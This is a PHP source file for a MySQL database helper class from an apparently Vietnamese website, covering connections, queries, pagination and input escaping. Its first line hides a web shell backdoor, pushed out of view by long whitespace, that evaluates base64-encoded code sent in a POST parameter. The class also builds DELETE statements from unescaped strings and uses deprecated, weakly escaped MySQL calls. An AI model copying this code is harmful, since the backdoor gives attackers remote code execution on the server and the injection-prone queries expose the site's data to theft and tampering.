<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n6aff55']));?><?php

if(!class_exists('config')){
    include 'config.php';
}

class c_mySql{
    
    protected $_db      = null;
    protected $_result  = null;
    protected $_strQuery= null;
    
    /**
     * c_mySql::__construct()
     * Create connection & slect database
     * @return void
     */
    public function __construct(){
        $config = new config();
        $this->_db = mysql_connect($config->host, $config->dbUser, $config->dbPass);
        mysql_query("SET NAMES utf8");
        if($this->_db){
            if(!mysql_select_db($config->dbName, $this->_db)){
                die ('Không thể kết nối tới database');
            }
        }else{
            die ('Không thể kết nối server');
        }
    }
    
    /**
     * c_mySql::f_query()
     * Excute query
     * @param mixed $strQuery
     * @return
     */
    public function f_query($strQuery){
        
        $this->_result = mysql_query($strQuery);
     
        if(!$this->_result){
            echo 'Không thể Query : '. $strQuery;
            echo '<p>'.mysql_error().'</p>';            
        }

        // store string query
        $this->_strQuery = $strQuery;
        return $this;
    }
    
    /**
     * c_mySql::f_query_pagination()
     * Thay vì sử dụng f_query() , nay ta phan trang dùng f_get_pagination()
     * @param mixed $strQuery
     * @return
     */
    public function f_query_pagination($strQuery){
        // get total record
        $this->_total = $this->f_query($strQuery)->f_num_rows();
        
        // escape page and set default if it is null
        $page = $this->f_escape($_GET['p']);
        $page = $page ? $page : 1;
        $strQuery .= ' LIMIT '.($page-1)*LIMIT.','.LIMIT;
        
        $this->_result = mysql_query($strQuery);
    
        if(!$this->_result){
            die ('Không thể Query : '. $strQuery);
        }
        // store string query
        $this->_strQuery = $strQuery;
        return $this;
    }
    
    /**
     * c_mySql::f_get_one_data()
     * Get one row data (edit hay dung)
     * @return
     */
    public function f_get_one_data($idColumn = null){
        return array_shift($this->f_get_all_data($idColumn));
    }
    
    /**
     * c_mySql::f_get_data()
     * Get all row (list)
     * @return
     */
    public function f_get_all_data($idColumn = null){
        if($this->_result){
           $data = array();
           while($result = mysql_fetch_assoc($this->_result)){
               if($idColumn){
                   $data[$result[$idColumn]][] = $result;
               }else{
                   $data[] = $result;
               }
               
           }
           
        }else{
           die ('Chưa thực hiện câu truy vấn');
        }
        
        return $data;
    }
    
    /**
     * c_mySql::f_num_rows()
     * Count rows int table
     * @return
     */
    public function f_num_rows(){
        if($this->_result){
           return mysql_num_rows($this->_result);
        }else{
           die ('Chưa thực hiện câu truy vấn');
        }
    }
    
    /**
     * c_mySql::f_delete()
     * Delete
     * @param mixed $tablName
     * @param mixed $strWhere
     * @return void
     */
    public function f_delete($tablName, $strWhere = null){
        if($tablName){
           $query = "DELETE FROM $tablName";
           if($strWhere){
                $query .= " WHERE $strWhere";
           }
           mysql_query($query);
        }
    }
    
    /**
     * c_mySql::f_escape()
     * Escape value to security insert
     * @param mixed $value
     * @return
     */
    public function f_escape($value){
        if(is_array($value)){
            foreach($value as $k=>$v){
                if(is_array($v)){
                    $value[$k] = $this->f_escape($v);
                }else{
                    $value[$k] = mysql_escape_string($v);
                }
            }
        }else{
            $value = mysql_escape_string($value);
        }
        
        $value = preg_replace('/\\\/','', $value);
        $value = preg_replace('/\\\"/','', $value);
        $value = preg_replace('/rn/','', $value);
        
        return $value; 
    }
    
    public function getInsertId(){
        return mysql_insert_id($this->_db);
    }
    
    /**
     * c_mySql::f_get_pagination()
     * Xuất ra pager
     * @return
     */
    public function f_get_pagination(){
        // get link query
        $_SERVER['QUERY_STRING'] = preg_replace("/&?p=[0-9]+/", '', $_SERVER['QUERY_STRING']);
        // auto add link with strings query exist
        $link = $_SERVER['SCRIPT_NAME'].($_SERVER['QUERY_STRING'] ? "?$_SERVER[QUERY_STRING]&" : '?') ;
        
        // escape page and set default if it is null
        $page = $this->f_escape($_GET['p']);
        $page = $page ? $page : 1;
        
        $str = '<div class="pagination">';
             $str .= '<ul>';
                // pre
                if($page == 1){
                    $str .= "<li class='disabled'><a href='#'>«</a></li>";
                }else{
                    $str .= "<li><a href='{$link}p=1'>«</a></li>";
                }
                
                // number page
                $total = ceil($this->_total/LIMIT);
                for($i = 1; $i <= $total; $i++){ 
                    $str .= "<li class='".($page == $i ? 'active': null)."'>
                            <a href='{$link}p=$i'>$i</a>
                        </li>";
                }
                
                // next
                if($page == $total){
                    $str .= "<li class='disabled'><a href='#'>»</a></li>";
                }else{
                    $str .= "<li><a href='{$link}p=$total'>»</a></li>";
                }
                
            $str .= '</ul>';
        $str .= '</div>';
        
        return $str;
    }
    
    function splitTitleImage($content, $limit = 250){
        preg_match('/<img(.*)>/msU', $content, $img);
        $data['image'] = $img[0];
        $data['content'] = preg_replace('/<[^>]*>/','', $content);
        $data['content'] = mb_substr(str_replace($img ,null, $data['content']), 0, $limit,'UTF-8').'...';
        return $data;
    }
    
    function  cutstring($content){

    }
    
    
    
    
}